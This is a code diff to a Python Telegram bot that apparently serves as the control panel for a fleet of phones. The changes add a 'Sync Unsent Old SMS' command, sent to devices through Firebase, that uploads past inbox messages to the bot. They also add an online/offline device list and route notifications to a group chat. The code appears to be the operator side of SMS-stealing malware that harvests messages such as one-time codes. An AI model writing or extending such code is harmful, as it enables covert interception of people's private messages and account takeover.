@@ -184,8 +184,9 @@ def build_sms_settings_message(dev):
         f"🆔 *Device ID:* `{dev.get('deviceId')}`\n"
         f"💬 *SMS Forwarding Status:* {fwd_status}\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"• *Turn SMS ON*: Enables live SMS forwarding and uploads old past inbox, new & upcoming SMS to bot.\n"
-        f"• *Turn SMS OFF*: Disables live SMS forwarding.\n\n"
+        f"• *Turn SMS ON*: Enables live SMS forwarding and scans inbox for any unsent past SMS.\n"
+        f"• *Turn SMS OFF*: Disables live SMS forwarding.\n"
+        f"• *Sync Past SMS*: Checks inbox and sends any past SMS that haven't been forwarded yet (duplicates will be skipped).\n\n"
         f"_Select an action below:_"
     )
 
@@ -196,8 +197,32 @@ def build_sms_settings_keyboard(dev_id, is_fwd_on):
         InlineKeyboardButton("🔴 Turn SMS OFF", callback_data=f"sms_off_{dev_id}")
     )
     markup.row(
-        InlineKeyboardButton("🔙 Back to Device Control", callback_data=f"dev_info_{dev_id}")
+        InlineKeyboardButton("📥 Sync Unsent Old SMS", callback_data=f"sync_old_{dev_id}")
     )
+    markup.row(
+        InlineKeyboardButton("🔙 Back to Device Control", callback_data=f"dev_info_{dev_id}"),
+        InlineKeyboardButton("📋 All Devices List", callback_data="dev_list")
+    )
+    return markup
+
+def build_device_list_message():
+    online_count = sum(1 for d in devices.values() if (time.time() - d.get("lastSeen", 0)) < 90)
+    return (
+        f"📱 *ALL CONNECTED DEVICES ({len(devices)})*\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🟢 *Online:* {online_count} | 🔴 *Offline:* {len(devices) - online_count}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"Select a device below to open its control center & settings:"
+    )
+
+def build_device_list_keyboard():
+    markup = InlineKeyboardMarkup()
+    for dev in devices.values():
+        online = (time.time() - dev.get("lastSeen", 0)) < 90
+        status_icon = "🟢" if online else "🔴"
+        btn_text = f"{status_icon} {dev.get('deviceAlias', 'Device')} ({dev.get('model')})"
+        markup.row(InlineKeyboardButton(btn_text, callback_data=f"dev_info_{dev['deviceId']}"))
+    markup.row(InlineKeyboardButton("🔄 Refresh Device List", callback_data="dev_list"))
     return markup
 
 # ----------------------------------------------------
@@ -366,26 +391,11 @@ def handle_text_messages(message):
                 reply_markup=build_main_reply_keyboard()
             )
 
-        if len(devices) == 1:
-            dev = list(devices.values())[0]
-            return bot.send_message(
-                chat_id,
-                build_device_control_message(dev),
-                parse_mode="Markdown",
-                reply_markup=build_device_main_keyboard(dev["deviceId"])
-            )
-
-        markup = InlineKeyboardMarkup()
-        for dev in devices.values():
-            status_icon = "🟢" if dev.get("isForwardingEnabled", True) else "🔴"
-            btn_text = f"{status_icon} {dev.get('deviceAlias', 'Device')} ({dev.get('model')})"
-            markup.row(InlineKeyboardButton(btn_text, callback_data=f"dev_info_{dev['deviceId']}"))
-
         return bot.send_message(
             chat_id,
-            "📱 *Connected Devices List:*\nSelect a device below to manage settings:",
+            build_device_list_message(),
             parse_mode="Markdown",
-            reply_markup=markup
+            reply_markup=build_device_list_keyboard()
         )
 
     if text in ["📊 Overall Status", "/info"]:
@@ -465,17 +475,12 @@ def handle_callback(call):
     if data == "dev_list":
         if not devices:
             return bot.answer_callback_query(call.id, "No devices connected")
-        markup = InlineKeyboardMarkup()
-        for dev in devices.values():
-            status_icon = "🟢" if dev.get("isForwardingEnabled", True) else "🔴"
-            btn_text = f"{status_icon} {dev.get('deviceAlias')} ({dev.get('model')})"
-            markup.row(InlineKeyboardButton(btn_text, callback_data=f"dev_info_{dev['deviceId']}"))
         bot.edit_message_text(
-            "📱 *Connected Devices List:*\nSelect a device below to manage settings:",
+            build_device_list_message(),
             chat_id,
             message_id,
             parse_mode="Markdown",
-            reply_markup=markup
+            reply_markup=build_device_list_keyboard()
         )
         return bot.answer_callback_query(call.id, "Updated device list")
 
@@ -489,6 +494,8 @@ def handle_callback(call):
 
     if not dev:
         return bot.answer_callback_query(call.id, "⚠️ Device not found")
+
+    target_notify = str(GROUP_CHAT_ID).strip() if GROUP_CHAT_ID else chat_id
 
     if action in ["dev_info", "refresh"]:
         bot.edit_message_text(
@@ -514,7 +521,7 @@ def handle_callback(call):
         dev["isForwardingEnabled"] = True
         devices[dev_id] = dev
         save_devices_to_file()
-        update_device_in_firebase(dev_id, {"isForwardingEnabled": True})
+        update_device_in_firebase(dev_id, {"isForwardingEnabled": True, "command": "sync_old"})
 
         bot.edit_message_text(
             build_sms_settings_message(dev),
@@ -523,11 +530,21 @@ def handle_callback(call):
             parse_mode="Markdown",
             reply_markup=build_sms_settings_keyboard(dev_id, True)
         )
-        bot.answer_callback_query(call.id, "🟢 SMS Forwarding Enabled")
+        bot.answer_callback_query(call.id, "🟢 SMS Forwarding Enabled & Syncing Past SMS")
         bot.send_message(
-            chat_id,
+            target_notify,
             f"🟢 *SMS Forwarding Enabled* for `{dev.get('deviceAlias')}`.\n\n"
-            f"📥 All past inbox SMS, new, and upcoming SMS will be uploaded and forwarded to this bot.",
+            f"Upcoming live SMS will be forwarded directly to this group. Any unsent past SMS are also being synced (duplicates will be skipped).",
+            parse_mode="Markdown"
+        )
+
+    elif action == "sync_old":
+        update_device_in_firebase(dev_id, {"command": "sync_old"})
+        bot.answer_callback_query(call.id, "📥 Syncing unsent past SMS from device...")
+        bot.send_message(
+            target_notify,
+            f"📥 *Inbox SMS Sync Initiated* for `{dev.get('deviceAlias')}`.\n\n"
+            f"Scanning phone inbox for any unsent past messages (duplicate SMS will be skipped).",
             parse_mode="Markdown"
         )
 
@@ -546,7 +563,7 @@ def handle_callback(call):
         )
         bot.answer_callback_query(call.id, "🔴 SMS Forwarding Disabled")
         bot.send_message(
-            chat_id,
+            target_notify,
             f"🔴 *SMS Forwarding Disabled* for `{dev.get('deviceAlias')}`.\n\n"
             f"Upcoming SMS messages will be stopped.",
             parse_mode="Markdown"
